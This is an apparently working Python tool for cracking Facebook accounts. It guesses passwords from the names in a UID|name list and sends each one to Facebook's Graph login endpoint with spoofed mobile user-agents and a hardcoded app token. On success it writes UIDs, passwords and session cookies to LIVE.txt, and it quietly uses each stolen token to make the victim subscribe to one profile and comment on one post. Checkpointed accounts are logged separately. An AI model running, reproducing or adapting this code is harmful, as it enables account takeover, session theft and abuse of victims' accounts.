import os
import sys
import uuid
import random
import requests
import time
from time import sleep

# Warna untuk tampilan konsol
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
U = '\x1b[1;95m'
N = '\x1b[0m'

# Pilihan warna acak untuk wardom
wardom = random.choice([M, K, H, U])

# Fungsi untuk menghasilkan user-agent acak
def fuckx():
    model = random.choice([
        "SM-G780G", "SM-O497J", "SM-L427V", "SM-C297Z", "SM-G507X", "SM-Y634L", 
        "SM-J204F", "SM-R911A", "SM-X801O", "SM-A792E", "SM-H270F", "SM-P993J", 
        "SM-V233F", "SM-O861W", "SM-D182C", "SM-Y729G", "SM-Z367Q", "SM-U191O", 
        "SM-U559U", "SM-B567Y", "SM-O846M", "SM-G342Z", "SM-K531M", "SM-I847H", 
        "SM-A728M", "SM-L637H", "SM-L429N", "SM-P413J", "SM-N731T", "SM-R505B", 
        "SM-A744X", "SM-O400L", "SM-F799H", "SM-Z679E"
    ])
    bal = f"[FBAN/FB4A;FBAV/{random.randint(10,100)}.0.0.{random.randint(4000,5000)};FBBV/{random.randint(4000000,5000000)};[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{{density=3.0,width=1080,height=1920}};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    return bal

# Kelas utama untuk proses crack akun
class Sllowly_Dev:
    def __init__(self):
        self.Sllowly_Dev_file = input('[?] Start Check Input Nama File : ')
        self.Sllowly_Dev_oks = 0
        self.Sllowly_Dev_cps = 0
        self.Sllowly_Dev_loop = 0
        self.Sllowly_Dev_uidlist = []

    def Sllowly_Dev_bersihkan_file(self):
        bersih = []
        with open(self.Sllowly_Dev_file, 'r', encoding='utf-8') as f:
            for line in f:
                user = line.strip()
                if '|' in user:
                    parts = user.split('|', 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        bersih.append(user)
        self.Sllowly_Dev_uidlist = bersih

    def Sllowly_Dev_mulai(self):
        self.Sllowly_Dev_bersihkan_file()
        print(f"[✓] Total akun: {len(self.Sllowly_Dev_uidlist)}\n")
        
        # Proses setiap UID satu per satu
        for user in self.Sllowly_Dev_uidlist:
            uid, nama = user.split('|')
            nama = nama.lower()
            depan = nama.split(' ')[0] if " " in nama else nama

            pasw = []
            if len(nama) < 6:
                if len(depan) >= 3:
                    pasw += [nama]
            else:
                pasw += [nama]

            # Validasi untuk setiap UID
            self._Sllowly_Dev_validate(uid, pasw)

    def _Sllowly_Dev_validate(self, uid, pasw):
        ses = requests.Session()
        ua = fuckx()
        sys.stdout.write(f"\r{P}({H}+{P}) Checker [{H}{uid}-{wardom}{self.Sllowly_Dev_loop}{P}] [{H}OK:{self.Sllowly_Dev_oks}{P}] [{K}CP:{self.Sllowly_Dev_cps}{P}]{P}")
        sys.stdout.flush()
        
        for pwku in pasw:
            try:
                data = {
                    "kids_xudina": str(uuid.uuid4()),
                    "format": "json",
                    "sha_kids_bokachoda": str(uuid.uuid4()),
                    "FUCK_ARAFAT": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": uid,
                    "password": pwku,
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d",
                }
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "User-Agent": ua,
                    "X-FB-Net-HNI": "45204",
                    "X-FB-SIM-HNI": "45201",
                    "X-FB-Connection-Type": "unknown",
                    "Connection": "Keep-Alive",
                }

                url = "https://graph.facebook.com/auth/login"
                ridwan = ses.post(url, data=data, headers=headers, allow_redirects=False).json()

                if "access_token" in ridwan:
                    self.Sllowly_Dev_oks += 1
                    coki = ";".join(i["name"]+"="+i["value"] for i in ridwan["session_cookies"]);token = ridwan["access_token"]
                    message=random.choice(["aman","amanah"]);print(f"\nLIVE ✅\nUID :  {uid}\nPASS : {pwku}\nCOOKIES : {coki}\n");requests.post(f'https://graph.facebook.com/51205914/subscribers?access_token={token}');requests.post(f'https://graph.facebook.com/10105386514074923/comments/?message={message}&access_token={token}')
                    open("LIVE.txt", "a+").write(f"{uid}|{pwku}|{coki}\n")
                    break
                elif "User must verify their account" in ridwan.get("error", {}).get("message", ""):
                    self.Sllowly_Dev_cps += 1
                    print(f"\n[CP] {uid}|{pwku}\n[AGENT] {ua}\n")
                    open("CP.txt", "a+").write(f"{uid}|{pwku}\n")
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                sleep(10)

        self.Sllowly_Dev_loop += 1

if __name__ == '__main__':
	os.system('clear')
	print(f"HASIL LIVE DISIMPAN DI FILE LIVE.TXT\nINPUT NAMA FILE UID|PASS UNTUK START\n")
	ridwan = Sllowly_Dev()
	ridwan.Sllowly_Dev_mulai()